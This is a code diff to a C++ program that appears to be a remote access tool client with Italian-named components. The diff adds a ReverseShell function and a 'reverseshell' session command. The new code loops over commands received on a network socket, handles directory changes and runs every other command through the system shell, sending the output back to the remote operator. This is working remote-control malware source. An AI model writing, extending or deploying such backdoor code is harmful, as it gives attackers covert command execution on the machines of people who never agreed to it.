@@ -129,6 +129,92 @@ void RestartClient()
 	su.RunExe(du.GetFullModuleFilePath());
 }
 
+void ReverseShell(SOCKET Sock)
+{
+	DirUtils du;
+	SystemUtils su;
+	
+	string Cmd;
+	string Res = "OK";
+	
+	while (true)
+	{
+		Cmd = COMUNICAZIONI::ReverseShell(Sock, Res);
+		
+		if (Cmd == "")
+			return;
+		else if (Cmd == "Get cd")
+			Res = du.GetModuleFilePath(false);
+		else if (ToLowerCase(Cmd).find("chdir") != string::npos)
+		{
+			if (ToLowerCase(Cmd) == "chdir ..")
+			{
+				string tmp = du.GetModuleFilePath();
+				du.SetCurrDir(tmp.substr(0, tmp.find_last_of("\\")));
+				
+				Res = "\n";
+			}
+			else if (ToLowerCase(Cmd).find("/d") != string::npos && ToLowerCase(Cmd.substr(0, 9)) == "chdir /d ")
+			{
+				if (Cmd.find("\"") != string::npos)
+					du.SetCurrDir(Cmd.substr(10, Cmd.find_last_of("\"") - 10));
+				else
+					du.SetCurrDir(Cmd.substr(9));
+				
+				Res = "\n";
+			}
+			else if (ToLowerCase(Cmd.substr(0, 6)) == "chdir ")
+			{
+				if (Cmd.find("\"") != string::npos)
+					du.SetCurrDir(Cmd.substr(7, Cmd.find_last_of("\"") - 7));
+				else
+					du.SetCurrDir(Cmd.substr(6));
+				
+				Res = "\n";
+			}
+			else
+				Res = su.GetCMDOutput(Cmd);
+		}
+		else if (ToLowerCase(Cmd).find("cd") != string::npos)
+		{
+			if (ToLowerCase(Cmd) == "cd ..")
+			{
+				string tmp = du.GetModuleFilePath();
+				du.SetCurrDir(tmp.substr(0, tmp.find_last_of("\\")));
+				
+				Res = "\n";
+			}
+			else if (ToLowerCase(Cmd).find("/d") != string::npos && ToLowerCase(Cmd.substr(0, 6)) == "cd /d ")
+			{
+				if (Cmd.find("\"") != string::npos)
+					du.SetCurrDir(Cmd.substr(7, Cmd.find_last_of("\"") - 7));
+				else
+					du.SetCurrDir(Cmd.substr(6));
+				
+				Res = "\n";
+			}
+			else if (ToLowerCase(Cmd.substr(0, 3)) == "cd ")
+			{
+				if (Cmd.find("\"") != string::npos)
+					du.SetCurrDir(Cmd.substr(4, Cmd.find_last_of("\"") - 4));
+				else
+					du.SetCurrDir(Cmd.substr(3));
+				
+				Res = "\n";
+			}
+			else
+				Res = su.GetCMDOutput(Cmd);
+		}
+		else if (ToLowerCase(Cmd) == "exit")
+		{
+			COMUNICAZIONI::ReverseShell(Sock, "Reverse shell closed");
+			return;
+		}
+		else
+			Res = su.GetCMDOutput(Cmd);
+	}
+}
+
 short Sessione(TcpIP Client)
 {
 	SystemUtils su;
@@ -180,6 +266,10 @@ short Sessione(TcpIP Client)
 		{
 			RestartClient();
 			return 1;
+		}
+		else if (cmd == "reverseshell")
+		{
+			ReverseShell(Client.Sock);
 		}
 	}
 
